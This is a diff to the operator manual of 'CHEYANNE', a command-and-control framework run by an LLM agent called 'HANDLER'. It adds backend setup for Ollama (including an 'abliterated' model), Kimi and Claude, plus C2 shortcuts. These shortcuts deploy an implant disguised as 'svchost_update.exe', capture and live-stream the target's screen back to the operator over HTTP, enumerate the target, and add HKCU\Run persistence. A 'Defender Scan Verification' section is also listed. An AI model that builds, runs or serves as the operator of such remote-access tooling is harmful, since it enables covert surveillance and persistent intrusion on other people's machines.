@@ -22,6 +22,9 @@ HARDWARE:        Own systems only.
 8. [C2 Infrastructure](#8-c2-infrastructure)
 9. [Testing Checklist](#9-testing-checklist)
 10. [Defender Scan Verification](#10-defender-scan-verification)
+11. [CHEYANNE — Discord C2 Infrastructure](#11-cheyanne--discord-c2-infrastructure)
+12. [HANDLER — AI-Powered C2 Operator](#12-handler--ai-powered-c2-operator)
+13. [C2 Shortcuts + Live Watch](#13-c2-shortcuts--live-watch)
 
 ---
 
@@ -1239,22 +1242,30 @@ The encrypted 7z backup contains the entire project including source, docs, evid
 ### Standalone Launch
 
 ```cmd
-:: Default (Ollama backend)
+:: Default (Ollama backend — local, free, slow)
 python cheyanne_agent.py
 
-:: Claude API backend
+:: Kimi K2.5 backend (OpenRouter — fast cloud API, ~$0.001/query)
+python cheyanne_agent.py --kimi
+
+:: Claude API backend (best quality, requires API key)
 set ANTHROPIC_API_KEY=sk-ant-...
 python cheyanne_agent.py --claude
 ```
 
-### Ollama Model Requirements
+### Backend Details
 
-Any model works — HANDLER uses prompt-based tool calling (not native tool API). Tested models:
+**Ollama** — Any model works. Prompt-based tool calling (not native tool API). Auto-detects by trying 127.0.0.1, LAN IP, localhost.
+
+**Kimi K2.5** — Uses OpenRouter API. Reads `OPENROUTER_API_KEY` from env or `%LOCALAPPDATA%\hermes\.env`. Kimi K2.5 is a reasoning model — content and reasoning tokens are separate. Note: direct Kimi API (`api.kimi.com/coding/v1`) is locked to whitelisted agents (Kimi CLI, Claude Code etc) — OpenRouter is the only path for custom code.
+
+**Claude** — Uses Anthropic API. Requires `ANTHROPIC_API_KEY` env var. Best tool compliance.
+
+### Tested Models (Ollama)
+
 - `mistral-nemo` (abliterated) — works, slower tool parsing
 - `llama3.1:8b` — good tool compliance
 - `qwen2.5-coder` — fast, good at structured output
-
-If Ollama is on LAN (not localhost), it auto-detects by trying 127.0.0.1, LAN IP, localhost.
 
 ### Adding New Tools
 
@@ -1273,4 +1284,55 @@ User input → LLM generates response with <tool> blocks
   → LLM analyzes results, may call more tools (up to 3 rounds)
   → Final text response displayed to operator
 ```
+
+---
+
+## 13. C2 Shortcuts + Live Watch
+
+### TCP C2 Shortcuts (chey> prompt)
+
+All shortcuts auto-find the first live TCP session. No `interact` needed.
+
 ```
+chey> deploy               Kill old implant + fresh download + launch
+chey> screenshot           Capture screen → HTTP POST back → save + open in explorer
+chey> watch                Live screen stream in browser (5s default refresh)
+chey> watch 3              3-second refresh
+chey> kill svchost_update.exe   taskkill on target
+chey> recon                Full target enumeration
+chey> persist              Set HKCU\Run registry key for persistence
+```
+
+### Live Watch — How It Works
+
+1. One-shot HTTP receiver starts on operator `:8891`
+2. PowerShell GDI screenshot command sent to target every N seconds
+3. Target `Invoke-WebRequest -Method POST` sends PNG back to operator
+4. Overwrites `screenshots/latest.png` each frame
+5. `screenshots/live.html` opened in browser — JS `setInterval` reloads image
+6. Ctrl+C stops the stream, reports frame count
+
+### Screenshot Auto-Pull
+
+Single `screenshot` command at `chey>`:
+1. Spins up one-shot HTTP receiver on `:8891`
+2. Captures screen on target via PowerShell GDI
+3. Target POSTs PNG back to operator
+4. Saves to `screenshots/radon_<timestamp>.png`
+5. Opens in explorer automatically
+
+### Port Conflict Handler
+
+`cheyanne_ops.py` provides automatic port conflict resolution:
+- `port_check(port)` — returns `(in_use, pid, process_name)`
+- `port_force(port)` — kills the process silently
+- `port_ensure(port)` — interactive menu: `[K]ill / [S]kip / [Q]uit`
+
+Menu items `[D]` and `[W]` auto-run `port_ensure()` before launching.
+
+### Menu Typed Commands
+
+The `CHEYANNE >` menu accepts both key letters and typed words:
+- `deploy` or `D` → opens C2 shell
+- `shell` or `c2` or `D` → opens C2 shell
+- Any unknown command shows error (no silent ignore)
